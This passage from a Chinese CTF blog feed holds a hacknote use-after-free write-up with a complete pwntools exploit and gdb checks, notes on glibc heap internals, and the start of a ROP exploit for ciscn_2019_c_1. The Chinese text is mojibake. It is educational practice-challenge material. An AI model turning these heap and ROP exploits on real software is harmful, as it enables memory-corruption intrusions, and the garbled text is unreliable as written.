version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;ç¬¬ 1 é¡µ\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div><script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>chunk Aæ˜¯ç”³è¯·çš„`note[0]`ç»“æ„ä½“çš„ç©ºé—´ï¼Œchunk Bæ˜¯`note[0]->content`çš„ç©ºé—´<p>chunk Cã€Dæ˜¯<code>note[1]</code>çš„ç©ºé—´</p><p>ç”±äºfastbinä¼šæŠŠåŒæ ·å¤§å°çš„å—æ”¾åœ¨åŒä¸€ä¸ªé“¾è¡¨ä¸Šï¼Œå› æ­¤ä¸¤ä¸ª0x8å¤§å°çš„chunk Aã€ chunk Cä¼šè¢«è¿åœ¨ä¸€èµ·ï¼Œå¹¶ä¸”ç”±äºfastbinä½¿ç”¨çš„æ˜¯å…ˆè¿›åå‡ºçš„å•å‘é“¾è¡¨ï¼ŒAåœ¨Cä¸‹é¢ã€‚</p><p>å½“ç”³è¯·ä¸€ä¸ªcontentå¤§å°ä¸º0x8çš„æ–°çš„noteæ—¶ï¼Œä¼šå°†Aå’ŒCä»fastbinä¸­å–å‡ºã€‚å…ˆmallocç»“æ„ä½“æœ¬èº«ï¼Œä½¿ç”¨chunk Cï¼Œç„¶åmalloc contentï¼Œä½¿ç”¨chunk Aã€‚</p><p>å› æ­¤<code>add(0x8,p32(magic))</code>ä¼šæŠŠmagicåœ°å€å†™å…¥contentï¼Œè°ƒç”¨showçš„æ—¶å€™ï¼Œä¼šç›´æ¥æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</p><p>ç†è®ºæ˜¯å¦‚æ­¤ï¼Œä¸‹é¢ç”¨gdbéªŒè¯ä¸€ä¸‹</p><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>å®Œæ•´expï¼Œåœ¨ä¸¤æ¬¡addã€ä¸¤æ¬¡deleteã€æœ€åä¸€æ¬¡addä¹‹ååˆ†åˆ«attachæŸ¥çœ‹notelist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br>menu = <span class="hljs-string">&#x27;Your choice :&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>dbg()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>dbg()<br>magic = <span class="hljs-number">0x08048986</span><br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>dbg()<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>åœ¨idaä¸­å¯ä»¥çœ‹åˆ°notelistçš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40â†‘r<br>.bss:0804A070                                         ; add_note+61â†‘w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸‰æ¬¡notelistçš„å†…å®¹ï¼Œ</p><p><img src="/img/UAF/1.jpg"></p><p><img src="/img/UAF/2.jpg"></p><p><img src="/img/UAF/3.jpg"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>0x92f31a0</code>ä¸Šçš„åœ°å€ä¸ºprint_noteå‡½æ•°çš„åœ°å€ï¼Œåœ¨freeä¹‹å‰ï¼Œ<code>0x92f31a4</code>ä¸Šçš„å†…å®¹æŒ‡å‘ä¸‹ä¸€è¡Œå¼€å¤´ï¼Œå³<code>aaaa</code>å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯note[0]ã€‚</p><p>åœ¨ç¬¬ä¸‰æ¬¡addä¹‹åæ”¹å˜äº†note[0]åŸæœ¬åœ¨print_noteä¸Šçš„å‡½æ•°æŒ‡é’ˆï¼Œå› æ­¤show(0)æ—¶ä¼šæ‰§è¡Œmagic</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heap åŸºç¡€çŸ¥è¯†</title>
    <link href="/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>size = 0æ—¶ï¼Œè¿”å›ç³»ç»Ÿå…è®¸çš„æœ€å°å†…å­˜å—</p><p>32ä½ç³»ç»Ÿä¸‹malloc(0)åˆ†é…8Bytesï¼Œ64ä½åˆ†é…16Bytes</p><h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h3><p>ä¼šæ¸…ç©ºchunkï¼Œå¹¶ä¸”ä¸ä»tcacheç§æ‹¿chunkï¼Œä½†æ˜¯freeæ—¶è¿˜æ˜¯ä¼šæ”¾åˆ°tcache bin</p><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>å †æ®µçš„èµ·ç‚¹å’Œç»ˆç‚¹æ ‡è¯†ç¬¦ï¼šstart_brkã€brkï¼ˆprogram brk)</p><p>ä¸å¼€ASLRï¼Œåˆå§‹æ—¶éƒ½æŒ‡å‘bssæ®µæœ«å°¾ï¼ˆend_data)</p><p>å¼€å¯ASLRï¼Œä¼šéšæœºå‘ååç§»ä¸€æ®µè·ç¦»</p><p><code>brk()</code>å‡½æ•°ä½œç”¨ä¸ºæŠ¬é«˜brkæŒ‡é’ˆï¼Œè·å–ä¸€æ®µheap</p><p>ç¨‹åºå¼€å§‹æ—¶heapå¤§å°ä¸º0ï¼Œç¬¬ä¸€æ¬¡ç”³è¯·å †çš„æ—¶å€™ï¼Œé€šè¿‡brk()å‘ç³»ç»Ÿç”³è¯·ä¸€æ®µå†…å­˜  <strong>main_arena</strong>ï¼Œåé¢mallocéƒ½ä¼šä»main_arenaä¸­ç”³è¯·å†…å­˜</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class="hljs-comment">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class="hljs-comment">/* Size in bytesï¼Œincluding overhead.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">fd</span>;</span>          <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk</span>;</span>          <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure><h4 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h4><p><strong><code>prevsize </code>ï¼š</strong>å¦‚æœå‰ä¸€ä¸ªchunkæ˜¯freeçš„<em><strong>ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯å†…å­˜ä¸­çš„å‰ä¸€ä¸ªï¼Œè€Œä¸æ˜¯freelistä¸­çš„å‰ä¸€ä¸ªï¼‰</strong></em>ï¼Œå®ƒä»£è¡¨å‰ä¸€ä¸ªchunkçš„å¤§å°ï¼›å¦‚æœä¸æ˜¯freeçš„ï¼Œå­˜å‚¨å‰ä¸€ä¸ªçš„user data ã€‚32ä½ä¸­æ˜¯4å­—èŠ‚ï¼Œ64ä½ä¸­æ˜¯8å­—èŠ‚</p><p><strong><code>size</code>ï¼š</strong>æ­¤chunkå¤§å°ã€‚æœ€ä½3ä½ç”¨æ¥å­˜å‚¨Nï¼ˆchunk åœ¨ non_main_arenaé‡Œä¸º1ï¼‰ã€Mï¼ˆchunkæ˜¯mmapå¾—åˆ°çš„ä¸º1ï¼‰ã€Pï¼ˆå‰ä¸€ä¸ªchunkå·²è¢«åˆ†é…ä¸º1 å¯¹åº”prevsizeï¼‰ï¼Œå› æ­¤sizeæ˜¯8å­—èŠ‚å¯¹é½çš„</p><p>æ²¡æœ‰ <strong>fd bk fd_nextsieze bk_nextsize</strong></p><p><strong><code>userdata</code>ï¼š</strong>æ•°æ®</p><p>ï¼ˆä¸‹ä¸€ä¸ªchunkçš„prevsizeä¹Ÿä¼šå­˜å‚¨userdataï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) ...   <span class="hljs-comment">//å¯ä»¥è®¡ç®—ç”³è¯·å­—èŠ‚éœ€è¦å®é™…åˆ†é…å¤šå°‘å­—èŠ‚</span></span><br></code></pre></td></tr></table></figure><p>chunkæ˜¯åœ¨prevsizeå¼€å§‹ï¼Œä½†æ˜¯mallocè¿”å›çš„æŒ‡é’ˆæŒ‡å‘userdata</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p><code>prevsize</code>ï¼šä¸Šä¸€ä¸ªchunkçš„userdataï¼Œå› ä¸ºä¸Šä¸€ä¸ªå¦‚æœä¹Ÿæ˜¯freeï¼Œåˆ™ä¼šè¢«åˆå¹¶ï¼ˆfast binä¸­å¯èƒ½ä¼šä¾‹å¤–ï¼Œåé¢ä¼šæåŠï¼‰</p><p><code>size</code>ï¼šåŒä¸Š</p><p><code>fd bk</code>ï¼šï¼ˆåœ¨freelistä¸­çš„ï¼‰å‰ä¸€ä¸ª/åä¸€ä¸ªchunk</p><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>ä½äºarenaé¡¶éƒ¨ã€‚åœ¨æ‰€æœ‰binéƒ½æ²¡æœ‰æ»¡è¶³éœ€æ±‚çš„chunkæ—¶ï¼Œä»top chunkåˆ‡å‰²</p><p>top chunk ä¸å¤Ÿï¼Œåœ¨main_arenaä¸­ä¼šç”¨brkæ‰©å¼ top chunkï¼Œnon_main_arenaä¸­ï¼Œç”¨mmapåˆ†é…æ–°çš„å †</p><h3 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h3><p>é™¤äº†fastbinè¢«å­˜å‚¨åœ¨ä¸€ä¸ªé•¿åº¦ä¸º10çš„fastbinYçš„æ•°ç»„é‡Œï¼Œå…¶ä½™çš„small large unsorted binéƒ½å­˜å‚¨åœ¨ä¸€ä¸ªbinsæ•°ç»„é‡Œ</p><p>NBINSæ˜¯126ï¼ŒåŒ…æ‹¬1ä¸ªunsorted binï¼Œ62ä¸ªsmall binï¼Œ63ä¸ªlarge binã€‚</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-17T04:09:19.532Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;ojfzveORWWdzC3RN6ooc\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;FyZdLwTWtfESSsWo7Yml\&quot; name=\&quot;ç¬¬ 1 é¡µ\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div><script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>#### fast bin<p>åœ¨freeä¸€ä¸ªchunkåˆ°fast binæ—¶ï¼Œå®ƒä¸‹ä¸€ä¸ªchunkçš„Pä½ï¼ˆPREV_INUSE)æ˜¯ä¸ä¼šå˜çš„ï¼Œè¿˜æ˜¯ä¸º1ï¼Œä¸ºäº†åŠ å¿«freeçš„æ•ˆç‡ã€‚<strong>å› æ­¤åœ°å€è¿ç»­çš„ä¸¤ä¸ªchunk è¢«freeåˆ°fast binï¼Œä»–ä»¬ä¸ä¼šè¢«åˆå¹¶</strong>ã€‚</p><p><strong>contentçš„å¤§å°èŒƒå›´ï¼š32ä½ï¼š8~80ï¼Œ64ä½ï¼š16~160</strong>ï¼Œéƒ½æ˜¯10ä¸ªbinï¼Œä½†æ˜¯å®é™…ä¸Šfastbinçš„å¤§å°èŒƒå›´å¹¶ä¸åŒ…å«æœ€å¤§çš„ä¸¤ä¸ªbin (64bit 0x80å°±å·²ç»ä¸è¿›fastbinäº†)</p><p>æ–°çš„chunkåŠ å…¥binæ—¶ï¼Œ<strong>fd</strong>æŒ‡å‘åŸæ¥çš„æ ˆé¡¶ï¼Œå…ˆè¿›åå‡ºï¼ˆLIFOï¼‰</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>å¤§å°èŒƒå›´</p><p>32ä½ï¼Œæœ€å°ä¸º16å­—èŠ‚ï¼Œå…¬å·®ä¸º8ï¼Œæœ€å¤§ä¸º504å­—èŠ‚ï¼Œæ‰€ä»¥æ˜¯62ä¸ªsmall bin</p><p>64ä¸ºï¼Œæœ€å°ä¸º32å­—èŠ‚ï¼Œå…¬å·®ä¸º16ï¼Œæœ€å¤§ä¸º1008å­—èŠ‚</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>å¤§å°èŒƒå›´</p><p>32ä½ï¼ˆå¤§äºç­‰äº512å­—èŠ‚ï¼‰64ä½ï¼ˆå¤§äºç­‰äº1024å­—èŠ‚ï¼‰ï¼Œæ¯ä¸ªé“¾è¡¨é‡Œçš„chunkä¸ä¸€å®šä¸€æ ·å¤§ï¼Œåªè¦æ˜¯å±äºæŸä¸ªç‰¹å®šåŒºé—´å°±è¡Œ</p><p>63ä¸ªbinè¢«åˆ†ä¸º6ç»„</p><table><thead><tr><th align="center"></th><th align="center">æ•°é‡</th><th align="center">å…¬å·®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">32</td><td align="center">64å­—èŠ‚</td></tr><tr><td align="center">2</td><td align="center">16</td><td align="center">512</td></tr><tr><td align="center">3</td><td align="center">8</td><td align="center">4096</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">32768</td></tr><tr><td align="center">5</td><td align="center">2</td><td align="center">262144</td></tr><tr><td align="center">6</td><td align="center">1</td><td align="center">ä¸é™åˆ¶</td></tr></tbody></table><p>ç¬¬ä¸€ç»„èµ·å§‹å¤§å°æ˜¯512ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ç»„çš„ç¬¬ä¸€ä¸ªbinçš„èŒƒå›´ä¸º[512,512+64) ï¼Œ æœ€åä¸€ä¸ªä¸º[512 + 64*31, 512 + 64*32)</p><p>ç¬¬äºŒç»„æ¥ç€ç¬¬ä¸€ç»„çš„æœ«å°¾ï¼Œç¬¬ä¸€ä¸ªbinä¹Ÿå°±æ˜¯[2560, 2560+ 512)ï¼Œä»¥æ­¤ç±»æ¨</p><p>æ¯ä¸ªçš„å…·ä½“å¤§å°å¯åœ¨ç¬¬å››ä¸ªå‚è€ƒæ–‡çŒ®é‡Œçœ‹</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­</p><p>åˆ†é…æ—¶ï¼Œå¦‚æœåœ¨unsorted biné‡Œæ²¡æ‰¾åˆ°åˆé€‚çš„chunkï¼Œåˆ™æŠŠunsorted biné‡Œçš„chunkåˆ†é…åˆ°small å’Œ largeé‡Œï¼Œï¼Œç„¶åå†åœ¨ bin ä¸­åˆ†é…åˆé€‚çš„ chunk</p><h3 id="å†…å­˜åˆ†é…æµç¨‹"><a href="#å†…å­˜åˆ†é…æµç¨‹" class="headerlink" title="å†…å­˜åˆ†é…æµç¨‹"></a>å†…å­˜åˆ†é…æµç¨‹</h3><p> <img src="/img/heapexploitation/1.jpg"></p><h3 id="å†…å­˜é‡Šæ”¾æµç¨‹"><a href="#å†…å­˜é‡Šæ”¾æµç¨‹" class="headerlink" title="å†…å­˜é‡Šæ”¾æµç¨‹"></a>å†…å­˜é‡Šæ”¾æµç¨‹</h3><p> <img src="/img/heapexploitation/2.jpg"></p><h3 id="tcacheç›¸å…³çŸ¥è¯†"><a href="#tcacheç›¸å…³çŸ¥è¯†" class="headerlink" title="tcacheç›¸å…³çŸ¥è¯†"></a>tcacheç›¸å…³çŸ¥è¯†</h3><p>ä»¥ä¸‹å…¨æ˜¯64ä½æœºå™¨æ¥è¯´</p><p>tcacheä»2.26å¼€å§‹æ‰æœ‰ï¼ŒtcacheåŒfastbinï¼Œå…ˆè¿›åå‡ºï¼Œä¸åŠ¨inuse</p><p>tcacheå‡ºç°åï¼Œæ¯æ¬¡äº§ç”Ÿå †éƒ½ä¼šå…ˆäº§ç”Ÿä¸€ä¸ª0x250å¤§å°çš„å †å—ï¼Œä½äºå †çš„å¼€å¤´ã€‚è¿™0x250ä¸­ï¼ˆheaderå 16å­—èŠ‚ï¼‰ï¼Œå‰0x40å­—èŠ‚ï¼Œå¯¹åº”64æ¡tcacheçš„é“¾è¡¨ï¼Œæè¿°æ¯ä¸ªé“¾è¡¨ä¸­çš„ä¸ªæ•°ï¼ˆæ¯ä¸ªé“¾è¡¨æœ€å¤š7ä¸ªchunkï¼‰ï¼Œç„¶å0x200å­—èŠ‚å¯¹åº”æ¯ä¸ªé“¾è¡¨çš„å¼€å¤´åœ°å€ã€‚</p><p>tcacheçš„64ä¸ªé“¾è¡¨ä»0x20å¼€å§‹ï¼Œåˆ°0x410ç»“æŸï¼Œå…¬å·®16å­—èŠ‚</p><p>tcacheçš„é“¾è¡¨æŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkçš„contentï¼Œè€Œä¸æ˜¯å¼€å¤´</p><blockquote><p>åœ¨è€çš„2.27ä¸­æ²¡æœ‰doublefreeæ£€æŸ¥</p></blockquote><h3 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h3><p><a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc</a></p><p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc å†…å­˜ç®¡ç† ptmalloc æºä»£ç åˆ†æ</a></p><p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP</title>
    <link href="/2022/11/16/ctf-pwn/ROP/"/>
    <url>/2022/11/16/ctf-pwn/ROP/</url>
    
    <content type="html"><![CDATA[<h3 id="é¢˜ç›®1"><a href="#é¢˜ç›®1" class="headerlink" title="é¢˜ç›®1"></a>é¢˜ç›®1</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) 